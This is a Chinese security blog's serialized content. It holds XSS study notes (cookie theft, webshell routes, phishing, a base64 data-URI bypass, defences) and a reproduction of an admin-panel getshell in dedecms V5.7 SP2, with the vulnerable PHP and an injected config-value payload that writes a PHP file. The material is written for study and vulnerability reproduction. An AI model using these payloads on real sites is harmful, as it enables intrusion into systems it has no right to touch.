title=\"XSS发动DOS/DDOS的情况？\"></a>XSS发动DOS/DDOS的情况？</h3><p>利用XSS恶意代码对网站不断发送请求，还可以劫持大量浏览器来实施攻击。</p>\n<h3 id=\"DOM型XSS的特殊性\"><a href=\"#DOM型XSS的特殊性\" class=\"headerlink\" title=\"DOM型XSS的特殊性\"></a>DOM型XSS的特殊性</h3><p>DOM型虽然和反射型类似，都需要诱使用户点击url，但是DOM型的url不需要经过服务器，在客户端浏览器就能执行。</p>\n<h3 id=\"同源策略\"><a href=\"#同源策略\" class=\"headerlink\" title=\"同源策略\"></a>同源策略</h3><p>同协议，同域名，同端口，可以防止从不同域装载文档或脚本。</p>\n<p>跨域方法：JSONP,Iframe,Flash</p>\n<h3 id=\"XSS结合\"><a href=\"#XSS结合\" class=\"headerlink\" title=\"XSS结合\"></a>XSS结合</h3><h4 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h4><p>CSRF攻击能够劫持终端用户在已登录的Web站点上执行非本意的操作。</p>\n<p>案例：iGaming CMS后台存在CSRF漏洞，后台利用Requests接收，可以改造添加管理元的url诱使管理员访问。</p>\n<h3 id=\"CRLF注射\"><a href=\"#CRLF注射\" class=\"headerlink\" title=\"CRLF注射\"></a>CRLF注射</h3><p>利用单个\\r\\n可以注入会话cookie(会话固定)，两个\\r\\n可以注入HTML/JavaScript代码。</p>\n<p>案例：某校园网登录界面存在CRLF注射，利用两个%0d%a可以执行js代码。</p>\n<h4 id=\"MHTML协议\"><a href=\"#MHTML协议\" class=\"headerlink\" title=\"MHTML协议\"></a>MHTML协议</h4><p>格式：mhtml:<a href=\"http://127.0.0.1/demo.html!demo\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/demo.html!demo</a></p>\n<p><a href=\"http://127.0.0.1/demo.html\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/demo.html</a> 对应 【Mhtml_File_Url】</p>\n<p>demo 对应 【Original_Resource_Url】</p>\n<p>【Original_Resource_Url】从消息体的Content-Location获得，如果不能从【Mhtml_File_Url】获得，会主动去【Original_Resource_Url】取获取下载内容。</p>\n<p>案例：豆瓣搜索文本出现过MHTML协议代码注射问题，能够执行XSS。</p>\n<h4 id=\"DATA-URI\"><a href=\"#DATA-URI\" class=\"headerlink\" title=\"DATA URI\"></a>DATA URI</h4><p>常用来绕过XSS的过滤</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"防御XSS\"><a href=\"#防御XSS\" class=\"headerlink\" title=\"防御XSS\"></a>防御XSS</h2><h3 id=\"输入过滤\"><a href=\"#输入过滤\" class=\"headerlink\" title=\"输入过滤\"></a>输入过滤</h3><h4 id=\"输入验证\"><a href=\"#输入验证\" class=\"headerlink\" title=\"输入验证\"></a>输入验证</h4><p>控制输入的格式</p>\n<h4 id=\"数据消毒\"><a href=\"#数据消毒\" class=\"headerlink\" title=\"数据消毒\"></a>数据消毒</h4><p>过滤敏感字符</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt; &gt;</span> ' \" &amp; # javascript expression</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"输出编码\"><a href=\"#输出编码\" class=\"headerlink\" title=\"输出编码\"></a>输出编码</h3><p>对敏感字符进行转义，将HTML特殊字符转成字符实体编码。</p>\n<h3 id=\"黑名单和白名单\"><a href=\"#黑名单和白名单\" class=\"headerlink\" title=\"黑名单和白名单\"></a>黑名单和白名单</h3><h3 id=\"DOM型\"><a href=\"#DOM型\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h3><ol>\n<li>避免客户端文档重写、重定向或其他敏感操作</li>\n<li>分析和强化客户端JS代码，尤其是一些受用户影响的DOM对象。Referrer属性，windowsname属性等</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"XSS跨站脚本-笔记\"><a href=\"#XSS跨站脚本-笔记\" class=\"headerlink\" title=\"XSS跨站脚本-笔记\"></a>XSS跨站脚本-笔记</h1><hr>\n<h2 id=\"XSS危害\"><a href=\"#XSS危害\" class=\"headerlink\" title=\"XSS危害\"></a>XSS危害</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.网络钓鱼,盗取用户账号</span><br><span class=\"line\">2.窃取用户cookie,利用用户身份进一步对网站执行操作</span><br><span class=\"line\">3.强制弹广告,刷流量</span><br><span class=\"line\">4.网页挂马  </span><br><span class=\"line\">5.客户端攻击,DDOS等</span><br><span class=\"line\">6.获取客户端信息,如浏览历史,真实ip,端口</span><br><span class=\"line\">7.结合csrf</span><br><span class=\"line\">8.提升用户权限,进一步渗透网站</span><br><span class=\"line\">9.跨站脚本蠕虫</span><br><span class=\"line\">等</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"如何利用XSS提权\"><a href=\"#如何利用XSS提权\" class=\"headerlink\" title=\"如何利用XSS提权?\"></a>如何利用XSS提权?</h3><p>如果后台存在XSS,当管理员触发时,可以利用JavaScript发送请求,该请求携带管理员的Cookie发送到服务器,在后台添加一个新管理员用户。（涉及Ajax技术）</p>\n<h3 id=\"利用XSS获取Webshell\"><a href=\"#利用XSS获取Webshell\" class=\"headerlink\" title=\"利用XSS获取Webshell?\"></a>利用XSS获取Webshell?</h3><p>1.特殊情况：Access+ASP架构，网站管理员出于某些原因把数据库文件后缀修改成ASP。</p>\n<p>网站存在存储型XSS，攻击者可写入一句话木马来getshell.</p>\n<p>2.后台存在存储型XSS，且后台具有数据库备份功能。攻击者上传含有一句话木马的图片，通过XSS劫持管理员会话将上传的图片重备份为Webshell。</p>\n<h3 id=\"网络钓鱼\"><a href=\"#网络钓鱼\" class=\"headerlink\" title=\"网络钓鱼\"></a>网络钓鱼</h3><p>钓鱼页面由以下几个部分组成</p>\n<ol>\n<li>钓鱼页面，经常是登录表单部分</li>\n<li>记录受害者登录信息的脚本</li>\n<li>XSS phishing Expliot :在有xss的页面插入利用代码<br>iframe框架的巧妙利用，覆盖原页面，迷惑性强</li>\n</ol>\n<h3 id=\"如果设置了Httponly如何利用XSS\"><a href=\"#如果设置了Httponly如何利用XSS\" class=\"headerlink\" title=\"如果设置了Httponly如何利用XSS\"></a>如果设置了Httponly如何利用XSS</h3><ol>\n<li><p>直接获取用户的明文账户密码信息，监听键盘记录</p>\n</li>\n<li><p>进行会话劫持</p>\n<p><a href=\"https://www.freebuf.com/articles/web/129384.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/129384.html</a></p>\n</li>\n</ol>\n<h3 id=\"XSS获取客户端信息\"><a href=\"#XSS获取客户端信息\" class=\"headerlink\" title=\"XSS获取客户端信息\"></a>XSS获取客户端信息</h3><ol>\n<li>利用JS获取CSS信息（CSS信息能定义访问过和未访问过的超链接样式）</li>\n<li>JS实现漏洞扫描</li>\n<li>获取剪贴板内容</li>\n<li>获取IP地址</li>\n</ol>\n<h3 id=\"XSS如何网页挂马？\"><a href=\"#XSS如何网页挂马？\" class=\"headerlink\" title=\"XSS如何网页挂马？\"></a>XSS如何网页挂马？</h3><p>攻击者通过篡改网页来实现，最常见的案例是利用一个长宽属性为0的<code>&lt;iframe&gt;</code>标签来加载木马页面。或者用JS动态调用网页木马。</p>\n<h3 id=\"XSS发动DOS-DDOS的情况？\"><a href=\"#XSS发动DOS-DDOS的情况？\" class=\"headerlink\" title=\"XSS发动DOS/DDOS的情况？\"></a>XSS发动DOS/DDOS的情况？</h3><p>利用XSS恶意代码对网站不断发送请求，还可以劫持大量浏览器来实施攻击。</p>\n<h3 id=\"DOM型XSS的特殊性\"><a href=\"#DOM型XSS的特殊性\" class=\"headerlink\" title=\"DOM型XSS的特殊性\"></a>DOM型XSS的特殊性</h3><p>DOM型虽然和反射型类似，都需要诱使用户点击url，但是DOM型的url不需要经过服务器，在客户端浏览器就能执行。</p>\n<h3 id=\"同源策略\"><a href=\"#同源策略\" class=\"headerlink\" title=\"同源策略\"></a>同源策略</h3><p>同协议，同域名，同端口，可以防止从不同域装载文档或脚本。</p>\n<p>跨域方法：JSONP,Iframe,Flash</p>\n<h3 id=\"XSS结合\"><a href=\"#XSS结合\" class=\"headerlink\" title=\"XSS结合\"></a>XSS结合</h3><h4 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h4><p>CSRF攻击能够劫持终端用户在已登录的Web站点上执行非本意的操作。</p>\n<p>案例：iGaming CMS后台存在CSRF漏洞，后台利用Requests接收，可以改造添加管理元的url诱使管理员访问。</p>\n<h3 id=\"CRLF注射\"><a href=\"#CRLF注射\" class=\"headerlink\" title=\"CRLF注射\"></a>CRLF注射</h3><p>利用单个\\r\\n可以注入会话cookie(会话固定)，两个\\r\\n可以注入HTML/JavaScript代码。</p>\n<p>案例：某校园网登录界面存在CRLF注射，利用两个%0d%a可以执行js代码。</p>\n<h4 id=\"MHTML协议\"><a href=\"#MHTML协议\" class=\"headerlink\" title=\"MHTML协议\"></a>MHTML协议</h4><p>格式：mhtml:<a href=\"http://127.0.0.1/demo.html!demo\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/demo.html!demo</a></p>\n<p><a href=\"http://127.0.0.1/demo.html\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/demo.html</a> 对应 【Mhtml_File_Url】</p>\n<p>demo 对应 【Original_Resource_Url】</p>\n<p>【Original_Resource_Url】从消息体的Content-Location获得，如果不能从【Mhtml_File_Url】获得，会主动去【Original_Resource_Url】取获取下载内容。</p>\n<p>案例：豆瓣搜索文本出现过MHTML协议代码注射问题，能够执行XSS。</p>\n<h4 id=\"DATA-URI\"><a href=\"#DATA-URI\" class=\"headerlink\" title=\"DATA URI\"></a>DATA URI</h4><p>常用来绕过XSS的过滤</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"防御XSS\"><a href=\"#防御XSS\" class=\"headerlink\" title=\"防御XSS\"></a>防御XSS</h2><h3 id=\"输入过滤\"><a href=\"#输入过滤\" class=\"headerlink\" title=\"输入过滤\"></a>输入过滤</h3><h4 id=\"输入验证\"><a href=\"#输入验证\" class=\"headerlink\" title=\"输入验证\"></a>输入验证</h4><p>控制输入的格式</p>\n<h4 id=\"数据消毒\"><a href=\"#数据消毒\" class=\"headerlink\" title=\"数据消毒\"></a>数据消毒</h4><p>过滤敏感字符</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt; &gt;</span> ' \" &amp; # javascript expression</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"输出编码\"><a href=\"#输出编码\" class=\"headerlink\" title=\"输出编码\"></a>输出编码</h3><p>对敏感字符进行转义，将HTML特殊字符转成字符实体编码。</p>\n<h3 id=\"黑名单和白名单\"><a href=\"#黑名单和白名单\" class=\"headerlink\" title=\"黑名单和白名单\"></a>黑名单和白名单</h3><h3 id=\"DOM型\"><a href=\"#DOM型\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h3><ol>\n<li>避免客户端文档重写、重定向或其他敏感操作</li>\n<li>分析和强化客户端JS代码，尤其是一些受用户影响的DOM对象。Referrer属性，windowsname属性等</li>\n</ol>\n"},{"title":"dedecms V5.7 SP2后台sys_info Getshell","date":"2019-03-12T02:58:48.000Z","_content":"\n# dedecms V5.7 SP2后台sys_info Getshell(复现)\n\n---\n\n## 思路：\n\n将恶意代码写入配置文件，通过文件包含来getshell\n\n## 代码分析：\n\n- dede/sys_info.php\n\n\n```php\n//保存配置的改动\nif($dopost==\"save\")\n{\n    if(!isset($token)){\n        echo 'No token found!';\n        exit;\n    }\n\t//验证token\n    if(strcasecmp($token, $_SESSION['token']) != 0){\n        echo 'Token mismatch!';\n        exit;\n    }\n    foreach($_POST as $k=>$v)\n    {\n        if(preg_match(\"#^edit___#\", $k))\n        {\n            $v = cn_substrR(${$k}, 1024);\n        }\n        else\n        {\n            continue;\n        }\n        $k = preg_replace(\"#^edit___#\", \"\", $k);\n        $dsql->ExecuteNoneQuery(\"UPDATE `#@__sysconfig` SET `value`='$v' WHERE varname='$k' \");\n    }\n    //更新配置函数\n    ReWriteConfig();\n    ShowMsg(\"成功更改站点配置！\", \"sys_info.php\");\n    exit();\n}\n```\n\n通过<font color=\"red\">foreach($_POST as $k=>$v)</font>接收参数后，更新了数据库，接着进入<font color=\"red\">ReWriteConfig()</font>函数更新配置。\n\n- ReWriteConfig\n\n  ```php\n  //更新配置函数\n  function ReWriteConfig()\n  {\n      global $dsql,$configfile;\n      if(!is_writeable($configfile))\n      {\n          echo \"配置文件'{$configfile}'不支持写入，无法修改系统配置参数！\";\n          exit();\n      }\n      $fp = fopen($configfile,'w');\n      flock($fp,3);\n      fwrite($fp,\"<\".\"?php\\r\\n\");\n      $dsql->SetQuery(\"SELECT `varname`,`type`,`value`,`groupid` FROM `#@__sysconfig` ORDER BY aid ASC \");\n      $dsql->Execute();\n      while($row = $dsql->GetArray())\n      {\n          if($row['type']=='number')\n          {\n              if($row['value']=='') $row['value'] = 0;\n              fwrite($fp,\"\\${$row['varname']} = \".$row['value'].\";\\r\\n\");\n          }\n          else\n          {\n              fwrite($fp,\"\\${$row['varname']} = '\".str_replace(\"'\",'',$row['value']).\"';\\r\\n\");\n          }\n      }\n      fwrite($fp,\"?\".\">\");\n      fclose($fp);\n  }\n  ```\n\n  这个函数将读取数据库来对配置文件进行更新，但是没有做验证。<font color=\"red\">while($row = $dsql->GetArray())</font>中有两个分支，这里利用的是第一个分支，当类型为数字型的参数直接写入配置文件。\n\n  接下来只要随便找一个默认数字型的参数就可以了。\n\n  登入后台，在<font color=\"red\">sys_info.php</font>搜索数字型的参数，这里以ftp为例\n\n  ![001](/img/dedecms/dedecms_V5.7_SP2后台sys_info_getshell/001.png)\n\n修改参数为：<font color=\"red\">21;fputs(fopen(\"phpinfo.php\", \"w\"), \"<?php phpinfo(); ?>\")</font>\n\nburp包如下\n\n![002](/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/002.png)\n\n查看返回包,修改配置成功\n\n![003](/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/003.png)\n\n生成phpinfo.php\n\n![004](/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/004.png)","source":"_posts/dedecms-V5.7-SP2后台sys_info Getshell.md","raw":"---\ntitle: dedecms V5.7 SP2后台sys_info Getshell\ndate: 2019-03-12 10:58:48\ntags: [cms]\ncategories: dedecms\n---\n\n# dedecms V5.7 SP2后台sys_info Getshell(复现)\n\n---\n\n## 思路：\n\n将恶意代码写入配置文件，通过文件包含来getshell\n\n## 代码分析：\n\n- dede/sys_info.php\n\n\n```php\n//保存配置的改动\nif($dopost==\"save\")\n{\n    if(!isset($token)){\n        echo 'No token found!';\n        exit;\n    }\n\t//验证token\n    if(strcasecmp($token, $_SESSION['token']) != 0){\n        echo 'Token mismatch!';\n        exit;\n    }\n    foreach($_POST as $k=>$v)\n    {\n        if(preg_match(\"#^edit___#\", $k))\n        {\n            $v = cn_substrR(${$k}, 1024);\n        }\n        else\n        {\n            continue;\n        }\n        $k = preg_replace(\"#^edit___#\", \"\", $k);\n        $dsql->ExecuteNoneQuery(\"UPDATE `#@__sysconfig` SET `value`='$v' WHERE varname='$k' \");\n    }\n    //更新配置函数\n    ReWriteConfig();\n    ShowMsg(\"成功更改站点配置！\", \"sys_info.php\");\n    exit();\n}\n```\n\n通过<font color=\"red\">foreach($_POST as $k=>$v)</font>接收参数后，更新了数据库，接着进入<font color=\"red\">ReWriteConfig()</font>函数更新配置。\n\n- ReWriteConfig\n\n  ```php\n  //更新配置函数\n  function ReWriteConfig()\n  {\n      global $dsql,$configfile;\n      if(!is_writeable($configfile))\n      {\n          echo \"配置文件'{$configfile}'不支持写入，无法修改系统配置参数！\";\n          exit();\n      }\n      $fp = fopen($configfile,'w');\n      flock($fp,3);\n      fwrite($fp,\"<\".\"?php\\r\\n\");\n      $dsql->SetQuery(\"SELECT `varname`,`type`,`value`,`groupid` FROM `#@__sysconfig` ORDER BY aid ASC \");\n      $dsql->Execute();\n      while($row = $dsql->GetArray())\n      {\n          if($row['type']=='number')\n          {\n              if($row['value']=='') $row['value'] = 0;\n              fwrite($fp,\"\\${$row['varname']} = \".$row['value'].\";\\r\\n\");\n          }\n          else\n          {\n              fwrite($fp,\"\\${$row['varname']} = '\".str_replace(\"'\",'',$row['value']).\"';\\r\\n\");\n          }\n      }\n      fwrite($fp,\"?\".\">\");\n      fclose($fp);\n  }\n  ```\n\n  这个函数将读取数据库来对配置文件进行更新，但是没有做验证。<font color=\"red\">while($row = $dsql->GetArray())</font>中有两个分支，这里利用的是第一个分支，当类型为数字型的参数直接写入配置文件。\n\n  接下来只要随便找一个默认数字型的参数就可以了。\n\n  登入后台，在<font color=\"red\">sys_info.php</font>搜索数字型的参数，这里以ftp为例\n\n  ![001](/img/dedecms/dedecms_V5.7_SP2后台sys_info_getshell/001.png)\n\n修改参数为：<font color=\"red\">21;fputs(fopen(\"phpinfo.php\", \"w\"), \"<?php phpinfo(); ?>\")</font>\n\nburp包如下\n\n![002](/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/002.png)\n\n查看返回包,修改配置成功\n\n![003](/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/003.png)\n\n生成phpinfo.php\n\n![004](/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/004.png)","slug":"dedecms-V5.7-SP2后台sys_info Getshell","published":1,"updated":"2019-06-19T17:23:13.383Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istc5000y4dsblzr201xr","content":"<h1 id=\"dedecms-V5-7-SP2后台sys-info-Getshell-复现\"><a href=\"#dedecms-V5-7-SP2后台sys-info-Getshell-复现\" class=\"headerlink\" title=\"dedecms V5.7 SP2后台sys_info Getshell(复现)\"></a>dedecms V5.7 SP2后台sys_info Getshell(复现)</h1><hr>\n<h2 id=\"思路：\"><a href=\"#思路：\" class=\"headerlink\" title=\"思路：\"></a>思路：</h2><p>将恶意代码写入配置文件，通过文件包含来getshell</p>\n<h2 id=\"代码分析：\"><a href=\"#代码分析：\" class=\"headerlink\" title=\"代码分析：\"></a>代码分析：</h2><ul>\n<li>dede/sys_info.php</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//保存配置的改动</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($dopost==<span class=\"string\">\"save\"</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($token))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'No token found!'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"comment\">//验证token</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strcasecmp($token, $_SESSION[<span class=\"string\">'token'</span>]) != <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'Token mismatch!'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span>($_POST <span class=\"keyword\">as</span> $k=&gt;$v)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"#^edit___#\"</span>, $k))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $v = cn_substrR($&#123;$k&#125;, <span class=\"number\">1024</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $k = preg_replace(<span class=\"string\">\"#^edit___#\"</span>, <span class=\"string\">\"\"</span>, $k);</span><br><span class=\"line\">        $dsql-&gt;ExecuteNoneQuery(<span class=\"string\">\"UPDATE `#@__sysconfig` SET `value`='$v' WHERE varname='$k' \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//更新配置函数</span></span><br><span class=\"line\">    ReWriteConfig();</span><br><span class=\"line\">    ShowMsg(<span class=\"string\">\"成功更改站点配置！\"</span>, <span class=\"string\">\"sys_info.php\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过<font color=\"red\">foreach($_POST as $k=&gt;$v)</font>接收参数后，更新了数据库，接着进入<font color=\"red\">ReWriteConfig()</font>函数更新配置。</p>\n<ul>\n<li><p>ReWriteConfig</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//更新配置函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ReWriteConfig</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $dsql,$configfile;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!is_writeable($configfile))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"配置文件'&#123;$configfile&#125;'不支持写入，无法修改系统配置参数！\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $fp = fopen($configfile,<span class=\"string\">'w'</span>);</span><br><span class=\"line\">    flock($fp,<span class=\"number\">3</span>);</span><br><span class=\"line\">    fwrite($fp,<span class=\"string\">\"&lt;\"</span>.<span class=\"string\">\"?php\\r\\n\"</span>);</span><br><span class=\"line\">    $dsql-&gt;SetQuery(<span class=\"string\">\"SELECT `varname`,`type`,`value`,`groupid` FROM `#@__sysconfig` ORDER BY aid ASC \"</span>);</span><br><span class=\"line\">    $dsql-&gt;Execute();</span><br><span class=\"line\">    <span class=\"keyword\">while</span>($row = $dsql-&gt;GetArray())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($row[<span class=\"string\">'type'</span>]==<span class=\"string\">'number'</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>($row[<span class=\"string\">'value'</span>]==<span class=\"string\">''</span>) $row[<span class=\"string\">'value'</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            fwrite($fp,<span class=\"string\">\"\\$&#123;$row['varname']&#125; = \"</span>.$row[<span class=\"string\">'value'</span>].<span class=\"string\">\";\\r\\n\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            fwrite($fp,<span class=\"string\">\"\\$&#123;$row['varname']&#125; = '\"</span>.str_replace(<span class=\"string\">\"'\"</span>,<span class=\"string\">''</span>,$row[<span class=\"string\">'value'</span>]).<span class=\"string\">\"';\\r\\n\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fwrite($fp,<span class=\"string\">\"?\"</span>.<span class=\"string\">\"&gt;\"</span>);</span><br><span class=\"line\">    fclose($fp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个函数将读取数据库来对配置文件进行更新，但是没有做验证。<font color=\"red\">while($row = $dsql-&gt;GetArray())</font>中有两个分支，这里利用的是第一个分支，当类型为数字型的参数直接写入配置文件。</p>\n<p>接下来只要随便找一个默认数字型的参数就可以了。</p>\n<p>登入后台，在<font color=\"red\">sys_info.php</font>搜索数字型的参数，这里以ftp为例</p>\n<p><img src=\"/img/dedecms/dedecms_V5.7_SP2%E5%90%8E%E5%8F%B0sys_info_getshell/001.png\" alt=\"001\"></p>\n</li>\n</ul>\n<p>修改参数为：<font color=\"red\">21;fputs(fopen(“phpinfo.php”, “w”), “<?php phpinfo(); ?>“)</font></p>\n<p>burp包如下</p>\n<p><img src=\"/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/002.png\" alt=\"002\"></p>\n<p>查看返回包,修改配置成功</p>\n<p><img src=\"/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/003.png\" alt=\"003\"></p>\n<p>生成phpinfo.php</p>\n<p><img src=\"/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/004.png\" alt=\"004\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"dedecms-V5-7-SP2后台sys-info-Getshell-复现\"><a href=\"#dedecms-V5-7-SP2后台sys-info-Getshell-复现\" class=\"headerlink\" title=\"dedecms V5.7 SP2后台sys_info Getshell(复现)\"></a>dedecms V5.7 SP2后台sys_info Getshell(复现)</h1><hr>\n<h2 id=\"思路：\"><a href=\"#思路：\" class=\"headerlink\" title=\"思路：\"></a>思路：</h2><p>将恶意代码写入配置文件，通过文件包含来getshell</p>\n<h2 id=\"代码分析：\"><a href=\"#代码分析：\" class=\"headerlink\" title=\"代码分析：\"></a>代码分析：</h2><ul>\n<li>dede/sys_info.php</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//保存配置的改动</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($dopost==<span class=\"string\">\"save\"</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($token))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'No token found!'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"comment\">//验证token</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strcasecmp($token, $_SESSION[<span class=\"string\">'token'</span>]) != <span 